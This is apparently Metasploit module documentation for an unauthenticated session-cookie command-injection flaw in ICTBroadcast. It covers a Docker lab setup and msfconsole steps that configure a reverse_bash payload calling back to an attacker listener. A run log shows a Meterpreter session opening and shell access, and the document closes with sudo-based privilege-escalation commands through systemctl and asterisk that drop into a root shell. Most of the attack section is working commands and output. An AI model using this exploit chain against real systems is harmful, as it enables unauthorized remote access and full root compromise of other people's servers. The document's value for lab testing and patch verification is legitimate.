## Vulnerable Application

This Metasploit module exploits an **unauthenticated remote code
execution (RCE)** vulnerability in **ICTBroadcast**.
The vulnerability exists due to improper handling of session
cookies in the authentication mechanism. An attacker can inject arbitrary system commands by modifying the session cookie.

The issue affects **various versions of ICTBroadcast**, but
specific impacted releases are currently unknown. The vulnerability allows an attacker to execute shell commands **without authentication**.

## Options

None

## Testing

To test the exploit, spin up a vulnerable ICTBroadcast instance with Docker.

```yaml
services:
  db:
    image: mariadb:10.6
    container_name: ictmysql
    restart: unless-stopped
    environment:
      MYSQL_ROOT_PASSWORD: root     
      MARIADB_ROOT_HOST: '%'       
      MYSQL_DATABASE: ictbroadcast
      MYSQL_USER: ictuser
      MYSQL_PASSWORD: ictpass
    volumes:
      - db_data:/var/lib/mysql
    ports:
      - "3306:3306"

  ictbroadcast:
    image: chocapikk/ictbroadcast-cve-2025-2611:latest
    container_name: ictbroadcast
    depends_on:
      - db
    ports:
      - "80:80"
      - "443:443"
    command: >
      bash -c "
        composer --working-dir=/usr require stefangabos/zebra_pagination &&
        /usr/sbin/httpd -k start &&
        /usr/sbin/php-fpm &&
        tail -f /dev/null
      "

volumes:
  db_data:
```

1. Start the stack:

```bash
docker compose up -d
```

2. Verify that the login page is reachable at **`http://localhost/login.php`**.
   The application should issue a valid session cookie on first visit.

3. Run the Metasploit module.
   The exploit will automatically harvest the session cookie (format may vary across deployments)
   and leverage it to execute arbitrary commands via the vulnerable endpoint.

## Verification Steps
1. Start **Metasploit Framework**:
```bash
msfconsole
```

2. Load the module:
```bash
use exploit/linux/http/ictbroadcast_unauth_cookie
```

3. Set the **target IP address**:
```bash
set RHOSTS <TARGET_IP>
```

4. Set the **payload** for command execution:
```bash
set PAYLOAD cmd/unix/reverse_bash
```

5. Configure the listener:
```bash
set LHOST <YOUR_IP>
set LPORT 4444
```

6. Check if the target is vulnerable:
```bash
check
```

7. Exploit the target:
```bash
exploit
```

## Scenarios

### Unauthenticated Command Execution
**Note**: Ensure that the target is vulnerable using the `check` command before running the exploit.

**Note**: The session cookie is retrieved dynamically and modified for command injection.

```bash
msf6 exploit(linux/http/ictbroadcast_unauth_cookie) > run http://lab
[*] Started reverse TCP handler on 192.168.1.36:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking ICTBroadcast via JS fingerprints
[+] JS fingerprint found; performing timing tests
[*] Retrieving session cookies dynamically
[*] Found cookies: BROADCAST=49b067ae1fdfbcab3d73caa1c7e6d75a
[+] The target is vulnerable. Injected RCE (slept 4s)
[*] Sending stage (3090404 bytes) to 192.168.128.3
[*] Meterpreter session 4 opened (192.168.1.36:4444 -> 192.168.128.3:53178) at 2025-08-04 17:50:33 +0200

meterpreter > sysinfo 
Computer     : 192.168.128.3
OS           : Red Hat 8.10 (Linux 6.15.8-2-cachyos)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter > shell
Process 877 created.
Channel 1 created.
SHELL=/bin/bash script -q /dev/null
bash-4.4$ sudo -l
sudo -l
Matching Defaults entries for asterisk on f7681361bd20:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User asterisk may run the following commands on f7681361bd20:
    (root) NOPASSWD: /usr/sbin/asterisk
    (root) NOPASSWD: /etc/init.d/asterisk
    (root) NOPASSWD: /etc/init.d/httpd
    (root) NOPASSWD: /etc/init.d/mysqld
    (root) NOPASSWD: /etc/init.d/kannel
    (root) NOPASSWD: /usr/sbin/ntpdate
    (root) NOPASSWD: /usr/sbin/rabbitmqctl
    (root) NOPASSWD: /bin/systemctl
bash-4.4$ 
```
#### Low-hanging LPE via systemctl

If `/bin/systemctl` is listed in sudo as NOPASSWD, you can escalate to root (outside Docker) via:

```bash
sudo systemctl 
!sh
```

*Source: [https://gtfobins.github.io/gtfobins/systemctl/#sudo](https://gtfobins.github.io/gtfobins/systemctl/#sudo)*

#### Low-hanging LPE via Asterisk NOPASSWD

If `/usr/sbin/asterisk` is listed in sudo as NOPASSWD, you can obtain a root shell by:

```bash
  # 1) Start Asterisk as root, in foreground so it creates its CLI socket
sudo asterisk -F

  # 2) Connect to the Asterisk console and drop into a root shell
sudo asterisk -r
f7681361bd20*CLI> !sh
sh-4.4#
```
